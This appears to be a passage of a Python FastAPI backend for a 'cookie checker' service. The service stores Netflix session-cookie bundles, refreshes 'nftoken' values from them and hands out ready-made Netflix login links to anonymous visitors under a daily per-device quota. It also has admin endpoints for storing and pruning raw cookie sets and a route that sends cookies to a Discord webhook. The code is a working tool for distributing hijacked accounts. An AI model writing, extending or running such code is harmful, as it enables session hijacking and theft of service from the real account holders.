            "job_id": job_id,
            "status": "queued",
            "success": False,
            "error": "; ".join(parse_errors + bundle_errors) or None,
            "total_bundles": len(bundles),
            "completed_bundles": 0,
            "total_cookies": total_cookies,
            "completed_cookies": 0,
            "accounts": [],
            "tokens": [],
            "cookie_bundles": _serialize_cookie_bundles(bundles),
        }
        asyncio.create_task(_run_bundle_check(job_id, bundles))
        return BundleCheckStartResponse(
            job_id=job_id,
            status="queued",
            total_bundles=len(bundles),
            total_cookies=total_cookies,
        )
    except HTTPException:
        raise
    except Exception as error:
        raise HTTPException(
            status_code=500, detail=f"Error starting bundle check: {error}"
        )


@app.get("/api/check-bundles/{job_id}", response_model=BundleCheckStatusResponse)
async def get_bundle_check_status(job_id: str):
    job = CHECK_JOBS.get(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Bundle check job not found")
    return BundleCheckStatusResponse(**job)


@app.post("/api/admin/login")
async def admin_login(login: AdminLoginRequest, request: Request, response: Response):
    expected_password = os.getenv("COOKIE_STORAGE_PASSWORD")
    if not expected_password:
        raise HTTPException(status_code=503, detail="Admin login is not configured")

    client_key = _admin_login_client_key(request)
    now = monotonic()
    attempts, locked_until = _ADMIN_LOGIN_ATTEMPTS.get(client_key, (0, 0.0))
    if locked_until > now:
        retry_after = max(1, ceil(locked_until - now))
        raise HTTPException(
            status_code=429,
            detail="Too many incorrect password attempts. Please try again later.",
            headers={"Retry-After": str(retry_after)},
        )
    if locked_until:
        attempts = 0

    if not hmac.compare_digest(login.password, expected_password):
        attempts += 1
        if attempts >= ADMIN_LOGIN_MAX_ATTEMPTS:
            locked_until = now + ADMIN_LOGIN_LOCKOUT_SECONDS
            _ADMIN_LOGIN_ATTEMPTS[client_key] = (attempts, locked_until)
            raise HTTPException(
                status_code=429,
                detail="Too many incorrect password attempts. Please try again later.",
                headers={"Retry-After": str(ADMIN_LOGIN_LOCKOUT_SECONDS)},
            )
        _ADMIN_LOGIN_ATTEMPTS[client_key] = (attempts, 0.0)
        raise HTTPException(status_code=401, detail="Invalid admin password")

    _ADMIN_LOGIN_ATTEMPTS.pop(client_key, None)
    response.set_cookie(
        ADMIN_COOKIE_NAME,
        _admin_cookie_value(),
        max_age=60 * 60 * 12,
        httponly=True,
        secure=False,
        samesite="lax",
        path="/",
    )
    return {"success": True}


@app.post("/api/admin/logout")
async def admin_logout(response: Response):
    response.delete_cookie(ADMIN_COOKIE_NAME, path="/")
    return {"success": True}


@app.get("/api/admin/session")
async def admin_session(request: Request):
    return {
        "is_admin": _is_admin(request),
        "login_lockout_seconds": _admin_login_lockout_seconds(request),
    }


@app.get("/api/stored-cookies")
async def list_public_stored_cookies():
    with _cookie_db() as connection:
        rows = connection.execute(
            "SELECT id, bundle_number, checked_at, account_success, token_success, account_json FROM checked_cookie_bundles ORDER BY id ASC"
        ).fetchall()
    return {
        "items": [
            {
                "id": row["id"],
                "storage_position": position,
                "bundle_number": row["bundle_number"],
                "checked_at": row["checked_at"],
                "account_success": bool(row["account_success"]),
                "token_success": bool(row["token_success"]),
                "account": json.loads(row["account_json"]),
            }
            for position, row in enumerate(rows, start=1)
        ]
    }


@app.get("/api/stored-cookies/health")
async def get_public_stored_cookie_health():
    return _get_stored_health_summary()


@app.get("/api/generator/status")
async def get_generator_status():
    return _get_generator_settings()


@app.post("/api/admin/generator/settings")
async def update_generator_settings(
    request: Request,
    payload: GeneratorSettingsRequest,
):
    _require_admin(request)
    message = payload.message.strip()
    if not message:
        raise HTTPException(status_code=422, detail="Maintenance message cannot be empty")
    if len(message) > 500:
        raise HTTPException(
            status_code=422,
            detail="Maintenance message must be 500 characters or fewer",
        )

    with _cookie_db() as connection:
        connection.execute(
            """
            UPDATE generator_settings
            SET enabled = ?, message = ?
            WHERE id = 1
            """,
            (int(payload.enabled), message),
        )
        connection.commit()
    return _get_generator_settings()


@app.get("/api/stored-cookies/next")
async def get_next_stored_cookie(request: Request, response: Response):
    generator_settings = _get_generator_settings()
    if not generator_settings["enabled"]:
        raise HTTPException(status_code=503, detail=generator_settings["message"])

    with _cookie_db() as connection:
        rows = connection.execute(
            "SELECT * FROM checked_cookie_bundles ORDER BY id ASC"
        ).fetchall()
    if not rows:
        raise HTTPException(status_code=404, detail="No stored cookie bundles available")

    is_admin = _is_admin(request)
    generation_count = None
    generation_date = None
    if not is_admin:
        device_id = _generator_device_id(request, response)
        usage_date = _generator_usage_date()
        now_iso = datetime.now(PHT_TIMEZONE).isoformat()
        with _cookie_db() as connection:
            usage = connection.execute(
                "SELECT generation_count, usage_date FROM generator_usage WHERE device_id = ?",
                (device_id,),
            ).fetchone()
            current_count = (
                int(usage["generation_count"])
                if usage and usage["usage_date"] == usage_date
                else 0
            )
            if current_count >= GENERATOR_MAX_GENERATIONS:
                raise HTTPException(
                    status_code=429,
                    detail=(
                        "Daily cookie generation limit reached. "
                        "Generations reset at 12:00 AM PHT."
                    ),
                )
            next_count = current_count + 1
            connection.execute(
                """
                INSERT INTO generator_usage (device_id, generation_count, usage_date, updated_at)
                VALUES (?, ?, ?, ?)
                ON CONFLICT(device_id) DO UPDATE SET
                    generation_count = excluded.generation_count,
                    usage_date = excluded.usage_date,
                    updated_at = excluded.updated_at
                """,
                (device_id, next_count, usage_date, now_iso),
            )
            generation_count = next_count
            generation_date = usage_date

    candidates = list(enumerate(rows))
    random.shuffle(candidates)
    last_refresh_error = "No working stored cookie bundles are available right now."

    for selected_index, row in candidates:
        try:
            refreshed = await _refresh_stored_bundle_token(row)
        except Exception as error:
            logging.warning(
                "Stored bundle token refresh failed for bundle %s: %s",
                row["id"],
                error,
            )
            refreshed = {
                "success": False,
                "bundle_number": row["bundle_number"],
                "checked_at": datetime.utcnow().isoformat(),
                "token": {
                    "bundle_number": row["bundle_number"],
                    "success": False,
                    "error": "Unable to refresh the Netflix token.",
                },
                "links": {},
            }

        account_data = json.loads(row["account_json"])
        if not isinstance(account_data, dict):
            account_data = {}

        account_check = None
        if not refreshed["success"]:
            account_check = await _check_bundle_account_after_token_failure(row)
            if account_check:
                account_data = account_check
            last_refresh_error = (
                refreshed["token"].get("error")
                or "This stored cookie bundle could not refresh its token."
            )

        _persist_stored_bundle_refresh(row["id"], refreshed, account_check)

        if not refreshed["success"]:
            continue

        storage_position = selected_index + 1
        token_data = refreshed["token"]
        return {
            "success": True,
            "id": row["id"],
            "storage_position": storage_position,
            "bundle_number": row["bundle_number"],
            "generation_count": generation_count,
            "generation_limit": None if is_admin else GENERATOR_MAX_GENERATIONS,
            "generation_date": generation_date,
            "checked_at": refreshed["checked_at"],
            "account": account_data,
            "token": token_data,
            "links": refreshed["links"],
        }

    raise HTTPException(status_code=410, detail=last_refresh_error)


@app.post("/api/admin/checked-cookies")
async def save_checked_cookies(request: Request, payload: AdminStoreRequest):
    _require_admin(request)
    bundle_id, deleted_duplicate_count = _store_checked_bundle(
        payload.bundle_number,
        payload.cookies,
        payload.account or {},
        payload.token or {},
    )
    return {
        "success": True,
        "id": bundle_id,
        "bundle_number": payload.bundle_number,
        "deleted_duplicate_count": deleted_duplicate_count,
    }


@app.get("/api/admin/checked-cookies")
async def list_checked_cookies(request: Request):
    _require_admin(request)
    with _cookie_db() as connection:
        _remove_existing_duplicate_accounts(connection)
        connection.commit()
        rows = connection.execute(
            "SELECT * FROM checked_cookie_bundles ORDER BY id ASC"
        ).fetchall()
    health = _get_stored_health_summary()
    return {
        "items": [
            {
                "id": row["id"],
                "storage_position": position,
                "bundle_number": row["bundle_number"],
                "checked_at": row["checked_at"],
                "account_success": bool(row["account_success"]),
                "token_success": bool(row["token_success"]),
                "account": json.loads(row["account_json"]),
                "token": json.loads(row["token_json"]),
                "cookies": json.loads(row["cookies_json"]),
            }
            for position, row in enumerate(rows, start=1)
        ],
        "health": health,
    }


@app.post("/api/admin/checked-cookies/{bundle_id}/refresh")
async def refresh_checked_cookies(bundle_id: int, request: Request):
    _require_admin(request)
    with _cookie_db() as connection:
        row = connection.execute(
            "SELECT * FROM checked_cookie_bundles WHERE id = ?", (bundle_id,)
        ).fetchone()
        if row is None:
            raise HTTPException(status_code=404, detail="Stored bundle not found")

        cookie_data = json.loads(row["cookies_json"])
        cookie_map = {
            item["name"]: item["value"]
            for item in cookie_data
            if item.get("name") and item.get("value")
        }
        if not cookie_map:
            raise HTTPException(
                status_code=422,
                detail="Stored bundle has no readable cookies to refresh.",
            )

        token_success, nftoken, token_error = await generate_nftoken(cookie_map)
        checked_at = datetime.utcnow().isoformat()
        token_result = {
            "bundle_number": row["bundle_number"],
            "success": bool(token_success and nftoken),
            "nftoken": nftoken,
            "error": token_error if not (token_success and nftoken) else None,
        }
        account_result = json.loads(row["account_json"])
        links = {}
        if nftoken:
            links = {
                "tv": f"https://www.netflix.com/tv2?nftoken={nftoken}",
                "netflix": f"https://netflix.com/?nftoken={nftoken}",
                "phone": f"https://www.netflix.com/unsupported?nftoken={nftoken}",
            }

        cursor = connection.execute(
            """
            UPDATE checked_cookie_bundles
            SET checked_at = ?, token_success = ?, token_json = ?
            WHERE id = ?
            """,
            (
                checked_at,
                int(bool(token_result.get("success"))),
                json.dumps(token_result),
                bundle_id,
            ),
        )
        connection.commit()
    return {
        "success": bool(token_result.get("success")),
        "bundle_number": row["bundle_number"],
        "checked_at": checked_at,
        "account": account_result,
        "token": token_result,
        "links": links,
    }


@app.delete("/api/admin/checked-cookies/dead")
async def delete_dead_checked_cookies(request: Request):
    _require_admin(request)
    with _cookie_db() as connection:
        cursor = connection.execute(
            "DELETE FROM checked_cookie_bundles WHERE account_success = 0 AND token_success = 0"
        )
        connection.commit()
    return {
        "deleted": cursor.rowcount,
        "health": _get_stored_health_summary(),
    }


@app.delete("/api/admin/checked-cookies/{bundle_id}")
async def delete_checked_cookies(bundle_id: int, request: Request):
    _require_admin(request)
    with _cookie_db() as connection:
        cursor = connection.execute(
            "DELETE FROM checked_cookie_bundles WHERE id = ?", (bundle_id,)
        )
        connection.commit()
    if cursor.rowcount == 0:
        raise HTTPException(status_code=404, detail="Stored bundle not found")
    return Response(status_code=204)


@app.get("/test-discord")
async def test_discord():
    webhook_url = os.getenv("DISCORD_WEBHOOK_URL")
    if not webhook_url:
        return {"error": "No webhook URL"}

    test_cookie = Cookie(name="test", value="hello-discord")
    await log_cookies_to_discord([test_cookie], webhook_url, "test-endpoint")
    return {"status": "sent"}


frontend_dist = Path(__file__).resolve().parent.parent / "frontend" / "dist"
if frontend_dist.exists():
    app.mount("/", StaticFiles(directory=frontend_dist, html=True), name="frontend")


if __name__ == "__main__":
    import uvicorn

    print("[STARTUP] 🚀 Starting Cookie Checker API...")
    uvicorn.run(app, host="0.0.0.0", port=8000)
